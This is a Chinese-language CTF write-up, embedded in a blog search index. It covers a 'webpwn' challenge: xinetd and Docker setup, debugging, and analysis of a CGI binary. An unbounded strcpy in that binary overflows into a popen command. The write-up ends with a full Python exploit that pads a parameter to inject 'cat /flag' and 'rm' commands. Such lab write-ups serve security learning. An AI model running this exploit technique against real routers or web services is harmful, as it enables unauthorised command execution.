+<h5 id="xinetd配置文件的主要类型"><a href="#xinetd配置文件的主要类型" class="headerlink" title="xinetd配置文件的主要类型"></a>xinetd配置文件的主要类型</h5><ol>
+<li><strong>主配置文件</strong> (<code>/etc/xinetd.conf</code>):<ul>
+<li>这是 <code>xinetd</code> 的全局配置文件，用于设置全局选项，如日志记录、服务目录等。</li>
+</ul>
+</li>
+<li><strong>服务配置文件</strong> (<code>/etc/xinetd.d/</code> 目录):<ul>
+<li>在这个目录中，每个文件定义了一个服务的配置。这些文件可以定义服务的启动方式、端口、协议、运行环境等。我们dockerfile中就有一句COPY .&#x2F;pwn.xinetd &#x2F;etc&#x2F;xinetd.d&#x2F;pwn，将配置导进去。</li>
+</ul>
+</li>
+</ol>
+<pre><code class="sh">service pwn
+&#123;
+    disable = no
+    flags = REUSE
+    socket_type = stream
+    protocol    = tcp
+    wait        = no
+    user        = root
+    type        = UNLISTED
+    port        = 1933
+    
+    bind        = 0.0.0.0
+    server      = /usr/sbin/chroot   
+    server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null
+    # safety options
+    per_source  = 5 # the maximum instances of this service per source IP address
+    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use
+    rlimit_as  = 100M # the Address Space resource limit for the service
+    #access_times = 8:50-17:10
+&#125;
+</code></pre>
+<h5 id="相关设置解释"><a href="#相关设置解释" class="headerlink" title="相关设置解释"></a>相关设置解释</h5><p><strong><code>disable = no</code></strong>:</p>
+<ul>
+<li>表示该服务是启用的。</li>
+</ul>
+<p><strong><code>flags = REUSE</code></strong>:</p>
+<ul>
+<li>允许重用端口，使得服务能够在连接关闭后快速重新绑定端口。</li>
+</ul>
+<p><strong><code>socket_type = stream</code></strong>:</p>
+<ul>
+<li>指定服务使用流套接字（即 TCP），用于可靠的双向通信。</li>
+</ul>
+<p><strong><code>protocol = tcp</code></strong>:</p>
+<ul>
+<li>指定使用 TCP 协议。</li>
+</ul>
+<p><strong><code>wait = no</code></strong>:</p>
+<ul>
+<li>指定服务不等待新连接，而是立即返回并处理新的连接请求。</li>
+</ul>
+<p><strong><code>user = root</code></strong>:</p>
+<ul>
+<li>指定服务以 root 用户身份运行。这意味着服务将具有系统上最高权限，因此需要小心安全设置。</li>
+</ul>
+<p><strong><code>type = UNLISTED</code></strong>:</p>
+<ul>
+<li>表示服务不是标准服务（即不在服务列表中）。</li>
+</ul>
+<p><strong><code>port = 1933</code></strong>:</p>
+<ul>
+<li>指定服务监听的端口是 1933。我们就是把主机端口映射到这个端口。</li>
+</ul>
+<p><strong><code>bind = 0.0.0.0</code></strong>:</p>
+<ul>
+<li>表示服务绑定在所有网络接口上，允许来自任何 IP 地址的连接。</li>
+</ul>
+<p><strong><code>server = /usr/sbin/chroot</code></strong>:</p>
+<ul>
+<li>指定用于运行服务的命令。在这里，<code>chroot</code> 用于创建一个新的根文件系统环境，以限制服务的访问范围。</li>
+</ul>
+<p><strong><code>server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null</code></strong>:</p>
+<ul>
+<li><code>--userspec=1000:1000</code>：指定以用户 ID 1000 和组 ID 1000 的权限运行 <code>pwn</code> 程序。根据配置，用户 ID 1000 可能是 <code>pwn</code> 用户。</li>
+<li><code>/home/pwn</code>：指定 <code>chroot</code> 环境的根目录。</li>
+<li><code>./pwn</code>：指定要执行的二进制文件 <code>pwn</code>。这个路径相对于 <code>/home/pwn</code>。</li>
+<li><code>/var/www/html</code>：<code>pwn</code> 程序的参数，可能是 Web 服务器的根目录或其他服务相关目录。</li>
+<li><code>2&gt;/dev/null</code>：将错误输出重定向到 <code>/dev/null</code>，忽略错误信息。</li>
+</ul>
+<p><strong><code>per_source = 5</code></strong>:</p>
+<ul>
+<li>限制每个源 IP 地址可以启动的服务实例数量为 5 个。</li>
+</ul>
+<p><strong><code>rlimit_cpu = 20</code></strong>:</p>
+<ul>
+<li>限制服务可以使用的最大 CPU 时间为 20 秒。</li>
+</ul>
+<p><strong><code>rlimit_as = 100M</code></strong>:</p>
+<ul>
+<li>限制服务使用的最大地址空间为 100 MB。</li>
+</ul>
+<p>**<code>access_times = 8:50-17:10</code>**（注释掉了）:</p>
+<ul>
+<li>如果启用，限制服务的访问时间。</li>
+</ul>
+<h4 id="环境搭建踩坑"><a href="#环境搭建踩坑" class="headerlink" title="环境搭建踩坑"></a>环境搭建踩坑</h4><p>这里题目给出的镜像如果直接build的话可能会有以下报错</p>
+<img src="/2024/09/21/webpwn/image-20240921212642490.png" class="">
+
+<p>解决方法可以是在dockerfile中手动把requests的版本指定好，我本地requests&#x3D;&#x3D;2.21.0可以成功构建。</p>
+<p>然后IDA调试中，其中上面设置的信息的路径是容器中的路径，然后我用主机的6666端口映射到容器中gdbserver的默认端口</p>
+<img src="/2024/09/21/webpwn/image-20240921212651224.png" class="">
+
+<p>之后patch时除了patch出一个死循环以外，还要把alarm给nop掉，不然会很快退出。</p>
+<p>之后要curl连的时候注意在容器中用的端口是它虚拟的端口，而不是主机映射的端口。（这里我把主机1337映射到容器1933端口）</p>
+<img src="/2024/09/21/webpwn/image-20240921212700543.png" class="">
+
+<img src="/2024/09/21/webpwn/image-20240921212709096.png" class="">
+
+<img src="/2024/09/21/webpwn/image-20240921212717324.png" class="">
+
+<p>然后把死循环跳转改回来就可以继续调试了。这种方法也可以用于上一题的调试。</p>
+<h4 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h4><p>前面的一些检测正常发包是不会被卡住的，除非curl时手动加上的X-Forwarded-For长度或格式不对。</p>
+<p>main函数主要逻辑在这里，其中会从Cgi表中逐个匹配我们所请求的资源名，如果匹配上就检测X-Forwarded-For的值是否为192.168.1.x(x&lt;&#x3D;20)，这里dest全局变量就是存着X-Forwarded-For的值。v21是’?’后面的get请求参数，必须要有。v22是ring_token参数，也必须被设置。之后会调用对应的cgi函数。题目中的cgi函数有那么几个：login.cgi，logout.cgi，wifictl.cgi，logctl.cgi。</p>
+<img src="/2024/09/21/webpwn/image-20240921212726642.png" class="">
+
+<p>然后我们查看函数表，发现里面有popen危险函数，然后看交叉引用就能找到logctl的具体实现。</p>
+<img src="/2024/09/21/webpwn/image-20240921212734273.png" class="">
+
+<img src="/2024/09/21/webpwn/image-20240921212742727.png" class="">
+
+<p>然后就能看到其具体实现，我们的目标就很明确了，想办法实现command的任意控制。</p>
+<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><p>这里sscanf函数没见过，查一下是可以以一个格式化字符串匹配，然后把第一个参数分割成若干块存在后面的参数中。</p>
+<p><code>%[^:]</code>表示匹配直到遇到下一个冒号为止的所有字符，并将它们存储在第二个参数指定的字符数组中。</p>
+<p>首先得绕过logctl函数中前面两个判断，token的格式必须为 <code>数字:数字</code>，然后：前面的数字会和两个值进行比较，要在范围外才能过。那么我们继续看交叉引用。</p>
+<img src="/2024/09/21/webpwn/image-20240921212751018.png" class="">
+
+<img src="/2024/09/21/webpwn/image-20240921212759252.png" class="">
+
+<p>发现是一个时间值，而且如果调用wifictl会把这个值打印出来。那么只要先访问这个cgi，就可以得到time的值，而另一端边界值固定为0x3c，那么我们设置token前半部分为time+1就行。</p>
+<p>之后发现command的值与v5有关，sub_402CAC这个函数会获取特殊字符，而前面的ban_char函数则是漏洞所在点。</p>
+<img src="/2024/09/21/webpwn/image-20240921212812164.png" class="">
+
+<p>主体逻辑是判断是否有v12中存的非法字符，我们通过logctl本体中<code>echo no support char is %s &gt; /var/www/blockingString</code>就能猜测这个逻辑。但是strcpy(s,a2)没有长度限制，可以溢出写v14，最后又会把v14写回a3，也就是v5，就实现了对command的控制。a2就是我们get传的参数值，上面会进行遍历参数键值对，所以我们用哪个参数触发漏洞都行。</p>
+<p>之后就能直接打了，由于是与web服务器交互，所以要用request库进行exp编写。这里我也懒得再写一份exp了，直接用提供的exp，改个端口，能正常获取flag。</p>
+<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">import warnings
+import requests
+import re
+
+def exp(url):
+    if url[len(url) - 1] != &#39;/&#39;:
+        print(&quot;[-] Target URL Format Error,The last char in url must be &#39;/&#39;.&quot;)
+        return False
+    
+    warnings.filterwarnings(&#39;ignore&#39;)
+    s = requests.session()
+    s.verify = False
+    header = &#123;
+        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#39;,
+        &#39;X-Forword-For&#39;: &#39;192.168.1.1&#39;
+    &#125;
+    
+    try:
+        # print(&quot;[+] login...&quot;)
+        ret = s.get(&quot;&#123;&#125;wifictl.cgi?ring_token=1&quot;.format(url), headers=header, timeout=8)
+        if ret.status_code == 200:
+            if &quot;now time is&quot; in ret.content.decode():
+                time_ret = re.search(r&quot;now time is (.+?)\.\n&quot;,ret.content.decode())
+                if time_ret is None:
+                    print(&quot;[-] time_ret re error, cannot get time&quot;)
+                    return False
+                else:
+                    now_time = time_ret.group(1)
+                    print(&quot;[+] now time is &quot; + now_time)
+            else:
+                print(&quot;[-] time_ret re error, cannot get time&quot;)
+                return False
+        else:
+            print(&quot;[-] status_code error, cannot get time&quot;)
+            return False
+        
+        cmd = &quot;a;&quot; + &quot;a&quot;*1311 + &quot;cat /flag &gt;/var/www/html/flag;&quot;       
+        new_url = &quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;.format(url, int(now_time)+1, cmd)
+        ret = s.get(new_url, headers=header, timeout=8)
+        ret = s.get(&quot;&#123;&#125;flag&quot;.format(url), headers=header, timeout=8)
+        if ret.status_code == 200:
+            print(ret.content.decode())
+        else:
+            print(&quot;[-] status_code error, cannot get flag&quot;)
+            return False
+        
+        cmd = &quot;a;&quot; + &quot;a&quot;*1311 + &quot;rm /var/www/html/flag;&quot;
+        new_url = &quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;.format(url, int(now_time)+1, cmd)
+        ret = s.get(new_url, headers=header, timeout=8)
+        if ret.status_code == 200:
+            return True
+        else:
+            print(&quot;[-] status_code error, cannot rm flag&quot;)
+            return False
+    
+    except Exception as reason:
+        if &#39;timed&#39; in repr(reason) or &#39;timeout&#39; in repr(reason):
+            print(&#39;[-] Fail, can not connect target for: timeout&#39;)
+            return False
+        else:
+            print(&#39;[-] Fail, can not connect target for: &#123;&#125;&#39;.format(repr(reason)))
+            return False
+
+if __name__ == &#39;__main__&#39;:
+    exp(&quot;http://127.0.0.1:1337/&quot;)
+</code></pre>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+</search>
